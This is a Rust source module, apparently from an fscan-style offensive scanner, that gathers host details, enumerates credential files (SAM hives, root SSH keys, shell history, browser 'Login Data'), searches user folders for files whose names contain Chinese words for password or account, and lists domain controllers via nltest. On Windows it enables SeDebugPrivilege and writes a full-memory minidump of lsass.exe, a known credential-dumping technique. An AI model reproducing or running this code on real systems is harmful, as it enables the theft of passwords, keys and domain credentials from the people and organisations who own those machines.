use anyhow::Result;
use std::collections::BTreeSet;
use std::env;
use std::fs;
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LocalSystemInfo {
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub home_dir: Option<PathBuf>,
    pub current_dir: Option<PathBuf>,
    pub sensitive_files: Vec<PathBuf>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MiniDumpInfo {
    pub process_name: String,
    pub pid: u32,
    pub output_path: PathBuf,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DcInfo {
    pub domain: String,
    pub domain_controllers: Vec<String>,
}

pub fn collect_local_system_info() -> Result<LocalSystemInfo> {
    let home_dir =
        env::var_os(if cfg!(windows) { "USERPROFILE" } else { "HOME" }).map(PathBuf::from);
    let current_dir = env::current_dir().ok();

    Ok(LocalSystemInfo {
        hostname: env::var("HOSTNAME")
            .or_else(|_| env::var("COMPUTERNAME"))
            .unwrap_or_else(|_| "unknown".to_string()),
        username: env::var("USER")
            .or_else(|_| env::var("USERNAME"))
            .unwrap_or_else(|_| "unknown".to_string()),
        os: env::consts::OS.to_string(),
        arch: env::consts::ARCH.to_string(),
        home_dir: home_dir.clone(),
        current_dir,
        sensitive_files: collect_sensitive_files(home_dir.as_deref()),
    })
}

pub fn collect_minidump() -> Result<Option<MiniDumpInfo>> {
    minidump::collect_minidump()
}

pub fn collect_dc_info() -> Result<Option<DcInfo>> {
    dcinfo::collect_dc_info()
}

fn collect_sensitive_files(home_dir: Option<&Path>) -> Vec<PathBuf> {
    let mut discovered = BTreeSet::new();
    for path in collect_fixed_sensitive_files(home_dir) {
        discovered.insert(path);
    }
    for path in search_sensitive_files(home_dir) {
        discovered.insert(path);
    }
    discovered.into_iter().collect()
}

fn collect_fixed_sensitive_files(home_dir: Option<&Path>) -> Vec<PathBuf> {
    fixed_sensitive_paths(home_dir)
        .into_iter()
        .flat_map(|path| expand_candidate_path(&path))
        .filter(|path| path.exists())
        .collect()
}

fn fixed_sensitive_paths(home_dir: Option<&Path>) -> Vec<PathBuf> {
    let mut candidates = if cfg!(windows) {
        vec![
            PathBuf::from(r"C:\boot.ini"),
            PathBuf::from(r"C:\windows\systems32\inetsrv\MetaBase.xml"),
            PathBuf::from(r"C:\windows\repair\sam"),
            PathBuf::from(r"C:\windows\system32\config\sam"),
        ]
    } else {
        vec![
            PathBuf::from("/etc/apache/httpd.conf"),
            PathBuf::from("/etc/httpd/conf/httpd.conf"),
            PathBuf::from("/etc/httpd/httpd.conf"),
            PathBuf::from("/usr/local/apache/conf/httpd.conf"),
            PathBuf::from("/home/httpd/conf/httpd.conf"),
            PathBuf::from("/usr/local/apache2/conf/httpd.conf"),
            PathBuf::from("/usr/local/httpd/conf/httpd.conf"),
            PathBuf::from("/etc/apache2/sites-available/000-default.conf"),
            PathBuf::from("/etc/apache2/sites-enabled/*"),
            PathBuf::from("/etc/apache2/sites-available/*"),
            PathBuf::from("/etc/apache2/apache2.conf"),
            PathBuf::from("/etc/nginx/nginx.conf"),
            PathBuf::from("/etc/nginx/conf.d/nginx.conf"),
            PathBuf::from("/etc/hosts.deny"),
            PathBuf::from("/etc/bashrc"),
            PathBuf::from("/etc/issue"),
            PathBuf::from("/etc/issue.net"),
            PathBuf::from("/etc/ssh/ssh_config"),
            PathBuf::from("/etc/termcap"),
            PathBuf::from("/etc/xinetd.d/*"),
            PathBuf::from("/etc/mtab"),
            PathBuf::from("/etc/vsftpd/vsftpd.conf"),
            PathBuf::from("/etc/xinetd.conf"),
            PathBuf::from("/etc/protocols"),
            PathBuf::from("/etc/logrotate.conf"),
            PathBuf::from("/etc/ld.so.conf"),
            PathBuf::from("/etc/resolv.conf"),
            PathBuf::from("/etc/sysconfig/network"),
            PathBuf::from("/etc/sendmail.cf"),
            PathBuf::from("/etc/sendmail.cw"),
            PathBuf::from("/proc/mounts"),
            PathBuf::from("/proc/cpuinfo"),
            PathBuf::from("/proc/meminfo"),
            PathBuf::from("/proc/self/environ"),
            PathBuf::from("/proc/1/cmdline"),
            PathBuf::from("/proc/1/mountinfo"),
            PathBuf::from("/proc/1/fd/*"),
            PathBuf::from("/proc/1/exe"),
            PathBuf::from("/proc/config.gz"),
            PathBuf::from("/root/.ssh/authorized_keys"),
            PathBuf::from("/root/.ssh/id_rsa"),
            PathBuf::from("/root/.ssh/id_rsa.keystore"),
            PathBuf::from("/root/.ssh/id_rsa.pub"),
            PathBuf::from("/root/.ssh/known_hosts"),
            PathBuf::from("/root/.bash_history"),
            PathBuf::from("/root/.mysql_history"),
        ]
    };

    if let Some(home) = home_dir {
        if cfg!(windows) {
            candidates.extend([
                home.join("AppData")
                    .join("Local")
                    .join("Google")
                    .join("Chrome")
                    .join("User Data")
                    .join("Default")
                    .join("Login Data"),
                home.join("AppData")
                    .join("Local")
                    .join("Google")
                    .join("Chrome")
                    .join("User Data")
                    .join("Local State"),
                home.join("AppData")
                    .join("Local")
                    .join("Microsoft")
                    .join("Edge")
                    .join("User Data")
                    .join("Default")
                    .join("Login Data"),
                home.join("AppData")
                    .join("Roaming")
                    .join("Mozilla")
                    .join("Firefox")
                    .join("Profiles"),
            ]);
        } else {
            candidates.extend([
                home.join(".config")
                    .join("google-chrome")
                    .join("Default")
                    .join("Login Data"),
                home.join(".mozilla").join("firefox"),
            ]);
        }
    }

    candidates
}

fn search_sensitive_files(home_dir: Option<&Path>) -> Vec<PathBuf> {
    let search_paths = if cfg!(windows) {
        let home = home_dir.unwrap_or_else(|| Path::new(r"C:\Users\Default"));
        vec![
            PathBuf::from(r"C:\Users\Public\Documents"),
            PathBuf::from(r"C:\Users\Public\Desktop"),
            home.join("Desktop"),
            home.join("Documents"),
            home.join("Downloads"),
            PathBuf::from(r"C:\Program Files"),
            PathBuf::from(r"C:\Program Files (x86)"),
        ]
    } else {
        let home = home_dir.unwrap_or_else(|| Path::new("/root"));
        vec![
            PathBuf::from("/home"),
            PathBuf::from("/opt"),
            PathBuf::from("/usr/local"),
            PathBuf::from("/var/www"),
            PathBuf::from("/var/log"),
            home.join("Desktop"),
            home.join("Documents"),
            home.join("Downloads"),
        ]
    };

    let mut matches = BTreeSet::new();
    for root in search_paths {
        walk_sensitive_paths(&root, &mut matches, 0, 2_000);
    }
    matches.into_iter().collect()
}

fn walk_sensitive_paths(
    root: &Path,
    matches: &mut BTreeSet<PathBuf>,
    visited: usize,
    max_entries: usize,
) -> usize {
    if visited >= max_entries || !root.exists() {
        return visited;
    }
    let root_text = root.to_string_lossy().to_lowercase();
    if is_blacklisted(&root_text) {
        return visited;
    }

    let mut visited = visited + 1;
    if root.is_file() {
        if is_whitelisted_name(
            root.file_name()
                .and_then(|value| value.to_str())
                .unwrap_or_default(),
        ) {
            matches.insert(root.to_path_buf());
        }
        return visited;
    }

    let entries = match fs::read_dir(root) {
        Ok(entries) => entries,
        Err(_) => return visited,
    };

    for entry in entries.flatten() {
        if visited >= max_entries {
            break;
        }
        let path = entry.path();
        let text = path.to_string_lossy().to_lowercase();
        if is_blacklisted(&text) {
            continue;
        }
        if is_whitelisted_name(
            path.file_name()
                .and_then(|value| value.to_str())
                .unwrap_or_default(),
        ) {
            matches.insert(path.clone());
        }
        if path.is_dir() {
            visited = walk_sensitive_paths(&path, matches, visited, max_entries);
        } else {
            visited += 1;
        }
    }

    visited
}

fn expand_candidate_path(path: &Path) -> Vec<PathBuf> {
    let text = path.to_string_lossy();
    if !text.contains('*') {
        return vec![path.to_path_buf()];
    }

    if let Some(parent) = path.parent() {
        return fs::read_dir(parent)
            .ok()
            .into_iter()
            .flat_map(|entries| entries.flatten().map(|entry| entry.path()))
            .collect();
    }

    Vec::new()
}

fn is_blacklisted(path: &str) -> bool {
    const BLACKLIST: &[&str] = &[
        ".exe",
        ".dll",
        ".png",
        ".jpg",
        ".bmp",
        ".xml",
        ".bin",
        ".dat",
        ".manifest",
        "locale",
        "winsxs",
        "windows\\sys",
    ];
    BLACKLIST.iter().any(|item| path.contains(item))
}

fn is_whitelisted_name(name: &str) -> bool {
    const WHITELIST: &[&str] = &[
        "密码",
        "账号",
        "账户",
        "配置",
        "服务器",
        "数据库",
        "备忘",
        "常用",
        "通讯录",
    ];
    let name = name.to_lowercase();
    WHITELIST.iter().any(|item| name.contains(item))
}

#[cfg(not(windows))]
mod minidump {
    use super::MiniDumpInfo;
    use anyhow::Result;

    pub fn collect_minidump() -> Result<Option<MiniDumpInfo>> {
        Ok(None)
    }
}

#[cfg(windows)]
mod minidump {
    use super::MiniDumpInfo;
    use anyhow::{Context, Result, anyhow, bail};
    use std::ffi::OsStr;
    use std::iter;
    use std::mem::{size_of, zeroed};
    use std::os::windows::ffi::OsStrExt;
    use std::path::PathBuf;
    use std::ptr::{null, null_mut};
    use windows_sys::Win32::Foundation::{
        CloseHandle, ERROR_SUCCESS, GetLastError, HANDLE, INVALID_HANDLE_VALUE,
    };
    use windows_sys::Win32::Security::{
        AdjustTokenPrivileges, AllocateAndInitializeSid, CheckTokenMembership,
        DOMAIN_ALIAS_RID_ADMINS, FreeSid, LUID, LUID_AND_ATTRIBUTES, LookupPrivilegeValueW,
        SE_PRIVILEGE_ENABLED, SECURITY_BUILTIN_DOMAIN_RID, SECURITY_NT_AUTHORITY, SID,
        TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY,
    };
    use windows_sys::Win32::Storage::FileSystem::{
        CREATE_ALWAYS, CreateFileW, FILE_ATTRIBUTE_NORMAL, GENERIC_WRITE,
    };
    use windows_sys::Win32::System::Diagnostics::Debug::MiniDumpWriteDump;
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW,
        TH32CS_SNAPPROCESS,
    };
    use windows_sys::Win32::System::Threading::{
        GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_ALL_ACCESS,
    };

    const MINI_DUMP_WITH_FULL_MEMORY: u32 = 0x0006_1907;

    pub fn collect_minidump() -> Result<Option<MiniDumpInfo>> {
        if !is_admin() {
            bail!("administrator privileges are required to create a minidump");
        }

        let pid = find_process_id("lsass.exe")?;
        enable_debug_privilege()?;

        let output_path = PathBuf::from(format!("fscan-{pid}.dmp"));
        write_minidump(pid, &output_path)?;

        Ok(Some(MiniDumpInfo {
            process_name: "lsass.exe".to_string(),
            pid,
            output_path,
        }))
    }

    fn is_admin() -> bool {
        unsafe {
            let mut sid: *mut SID = null_mut();
            let nt_authority = SECURITY_NT_AUTHORITY;
            if AllocateAndInitializeSid(
                &nt_authority,
                2,
                SECURITY_BUILTIN_DOMAIN_RID,
                DOMAIN_ALIAS_RID_ADMINS,
                0,
                0,
                0,
                0,
                0,
                0,
                &mut sid as *mut _ as *mut _,
            ) == 0
            {
                return false;
            }

            let mut is_member = 0i32;
            let ok = CheckTokenMembership(0, sid as *mut _, &mut is_member);
            FreeSid(sid as *mut _);
            ok != 0 && is_member != 0
        }
    }

    fn enable_debug_privilege() -> Result<()> {
        unsafe {
            let mut token = 0 as HANDLE;
            if OpenProcessToken(
                GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                &mut token,
            ) == 0
            {
                bail!("OpenProcessToken failed: {}", GetLastError());
            }

            let result = (|| {
                let mut luid = LUID {
                    LowPart: 0,
                    HighPart: 0,
                };
                let privilege = wide("SeDebugPrivilege");
                if LookupPrivilegeValueW(null(), privilege.as_ptr(), &mut luid) == 0 {
                    bail!("LookupPrivilegeValueW failed: {}", GetLastError());
                }

                let mut privileges = TOKEN_PRIVILEGES {
                    PrivilegeCount: 1,
                    Privileges: [LUID_AND_ATTRIBUTES {
                        Luid: luid,
                        Attributes: SE_PRIVILEGE_ENABLED,
                    }],
                };
                if AdjustTokenPrivileges(
                    token,
                    0,
                    &mut privileges,
                    size_of::<TOKEN_PRIVILEGES>() as u32,
                    null_mut(),
                    null_mut(),
                ) == 0
                {
                    bail!("AdjustTokenPrivileges failed: {}", GetLastError());
                }
                if GetLastError() != ERROR_SUCCESS {
                    bail!("AdjustTokenPrivileges reported error: {}", GetLastError());
                }
                Ok(())
            })();

            CloseHandle(token);
            result
        }
    }

    fn find_process_id(name: &str) -> Result<u32> {
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snapshot == INVALID_HANDLE_VALUE {
                bail!("CreateToolhelp32Snapshot failed: {}", GetLastError());
            }

            let result = (|| {
                let mut entry: PROCESSENTRY32W = zeroed();
                entry.dwSize = size_of::<PROCESSENTRY32W>() as u32;

                if Process32FirstW(snapshot, &mut entry) == 0 {
                    bail!("Process32FirstW failed: {}", GetLastError());
                }

                loop {
                    if utf16_to_string(&entry.szExeFile) == name {
                        return Ok(entry.th32ProcessID);
                    }
                    if Process32NextW(snapshot, &mut entry) == 0 {
                        break;
                    }
                }

                bail!("process not found: {name}")
            })();

            CloseHandle(snapshot);
            result
        }
    }

    fn write_minidump(pid: u32, output_path: &PathBuf) -> Result<()> {
        unsafe {
            let process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
            if process == 0 {
                bail!("OpenProcess failed: {}", GetLastError());
            }

            let result = (|| {
                let output = wide_os(output_path.as_os_str());
                let file = CreateFileW(
                    output.as_ptr(),
                    GENERIC_WRITE,
                    0,
                    null(),
                    CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL,
                    0,
                );
                if file == INVALID_HANDLE_VALUE {
                    bail!("CreateFileW failed: {}", GetLastError());
                }

                let dump_result = if MiniDumpWriteDump(
                    process,
                    pid,
                    file,
                    MINI_DUMP_WITH_FULL_MEMORY,
                    null_mut(),
                    null_mut(),
                    null_mut(),
                ) == 0
                {
                    Err(anyhow!("MiniDumpWriteDump failed: {}", GetLastError()))
                } else {
                    Ok(())
                };

                CloseHandle(file);
                dump_result
            })();

            if result.is_err() {
                let _ = std::fs::remove_file(output_path);
            }
            CloseHandle(process);
            result.context("failed to create process minidump")
        }
    }

    fn wide(value: &str) -> Vec<u16> {
        OsStr::new(value)
            .encode_wide()
            .chain(iter::once(0))
            .collect()
    }

    fn wide_os(value: &OsStr) -> Vec<u16> {
        value.encode_wide().chain(iter::once(0)).collect()
    }

    fn utf16_to_string(buffer: &[u16]) -> String {
        let end = buffer
            .iter()
            .position(|value| *value == 0)
            .unwrap_or(buffer.len());
        String::from_utf16_lossy(&buffer[..end])
    }
}

#[cfg(not(windows))]
mod dcinfo {
    use super::DcInfo;
    use anyhow::Result;

    pub fn collect_dc_info() -> Result<Option<DcInfo>> {
        Ok(None)
    }
}

#[cfg(windows)]
mod dcinfo {
    use super::DcInfo;
    use anyhow::{Context, Result};
    use std::process::Command;

    pub fn collect_dc_info() -> Result<Option<DcInfo>> {
        let domain = current_domain()?;
        let Some(domain) = normalize_domain(domain) else {
            return Ok(None);
        };

        let output = Command::new("nltest")
            .arg(format!("/dclist:{domain}"))
            .output()
            .context("failed to execute nltest for domain controller discovery")?;
        if !output.status.success() {
            return Ok(None);
        }

        let stdout = String::from_utf8_lossy(&output.stdout);
        let mut controllers = Vec::new();
        for line in stdout.lines() {
            let trimmed = line.trim();
            if let Some(rest) = trimmed.strip_prefix("\\\\") {
                let name = rest
                    .split_whitespace()
                    .next()
                    .unwrap_or_default()
                    .trim_matches('\\')
                    .to_string();
                if !name.is_empty() && !controllers.iter().any(|existing| existing == &name) {
                    controllers.push(name);
                }
            }
        }

        if controllers.is_empty() {
            return Ok(None);
        }

        Ok(Some(DcInfo {
            domain,
            domain_controllers: controllers,
        }))
    }

    fn current_domain() -> Result<String> {
        let output = Command::new("cmd")
            .args(["/C", "echo %USERDOMAIN%"])
            .output()
            .context("failed to query USERDOMAIN")?;
        Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
    }

    fn normalize_domain(value: String) -> Option<String> {
        let domain = value.trim().trim_matches('.').to_string();
        if domain.is_empty() || domain.eq_ignore_ascii_case("%USERDOMAIN%") {
            None
        } else {
            Some(domain)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::{SystemTime, UNIX_EPOCH};

    #[test]
    fn collects_local_system_info() {
        let info = collect_local_system_info().expect("local info should collect");
        assert!(!info.hostname.is_empty());
        assert!(!info.username.is_empty());
        assert!(!info.os.is_empty());
        assert!(!info.arch.is_empty());
    }

    #[test]
    fn expands_wildcard_candidates() {
        let root = temp_path("expand-wildcard");
        fs::create_dir_all(&root).expect("directory should create");
        let child = root.join("child.txt");
        fs::write(&child, b"x").expect("file should write");

        let expanded = expand_candidate_path(&root.join("*"));
        assert!(expanded.contains(&child));

        let _ = fs::remove_file(child);
        let _ = fs::remove_dir(root);
    }

    #[test]
    fn finds_whitelisted_sensitive_names() {
        let root = temp_path("search-sensitive");
        let nested = root.join("nested");
        fs::create_dir_all(&nested).expect("directory should create");
        let target = nested.join("数据库配置.txt");
        fs::write(&target, b"secret").expect("file should write");

        let mut matches = BTreeSet::new();
        walk_sensitive_paths(&root, &mut matches, 0, 128);
        assert!(matches.contains(&target));

        let _ = fs::remove_file(target);
        let _ = fs::remove_dir(nested);
        let _ = fs::remove_dir(root);
    }

    #[test]
    fn minidump_is_noop_on_non_windows() {
        if cfg!(windows) {
            return;
        }
        assert_eq!(collect_minidump().expect("minidump should return"), None);
    }

    fn temp_path(name: &str) -> PathBuf {
        let suffix = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("time should progress")
            .as_nanos();
        env::temp_dir().join(format!("rscan-platform-{name}-{suffix}"))
    }
}
